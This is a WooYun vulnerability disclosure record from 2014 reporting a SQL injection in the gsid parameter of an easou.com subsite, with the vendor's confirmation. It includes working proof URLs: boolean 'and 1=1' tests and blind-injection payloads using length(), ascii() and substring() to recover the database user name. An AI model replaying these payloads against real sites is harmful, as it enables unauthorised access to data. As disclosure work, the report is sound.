{"id": 47248, "wybug_id": "wooyun-2014-087507", "wybug_title": "宜搜某站点SQL注射一枚", "wybug_corp": "easou.com", "wybug_author": "lijiejie", "wybug_date": "2014-12-17 15:35", "wybug_open_date": "2015-01-31 15:36", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-17：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-17：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-31：\t细节向公众公开  简要描述： 宜搜某站点SQL注射 详细说明：  注入点：\nhttp://wz.easou.com/gs.e?esid=U4xDHpoG85s&gsid=1631&gsname=%E4%B9%A6%E7%B1%8D&wver=t\n参数gsid可注入。其他页面的类似参数也需要排查。   漏洞证明：  \nhttp://wz.easou.com/gs.e?esid=U4xDHpoG85s&gsname=%E4%B9%A6%E7%B1%8D&wver=t&gsid=1631 and 1=1http://wz.easou.com/gs.e?esid=U4xDHpoG85s&gsname=%E4%B9%A6%E7%B1%8D&wver=t&gsid=1631 and 1=2\n第一个URL返回淘宝网等APP，第二个无法返回结果。\n\n\n\n\nhttp://wz.easou.com/gs.e?esid=U4xDHpoG85s&gsid=1631%2blength(user())-2&gsname=%E4%B9%A6%E7%B1%8D&wver=t\n返回了跟1631一样的淘宝APP，说明user()的长度为2。\nhttp://wz.easou.com/gs.e?esid=U4xDHpoG85s&gsid=1631%2bascii(user())-87&gsname=%E4%B9%A6%E7%B1%8D&wver=t\n同样是返回淘宝，证明ascii函数，length函数,user()均可用，并且user()的第一个字符ASCII码为87，正好是字符大写的W。\nhttp://wz.easou.com/gs.e?esid=U4xDHpoG85s&gsid=1631%2bascii(substring(user()%2C2%2C1))-90&gsname=%E4%B9%A6%E7%B1%8D&wver=t\n上述URL证明substring函数可用，并且user()第二个字符ASCII码为90，正好是大写的Z。综上，可证明user()是 'WZ'。   修复方案：  过滤和必要的转义   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-12-17 15:49 厂商回复： 谢谢指出，我们会及时改正 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}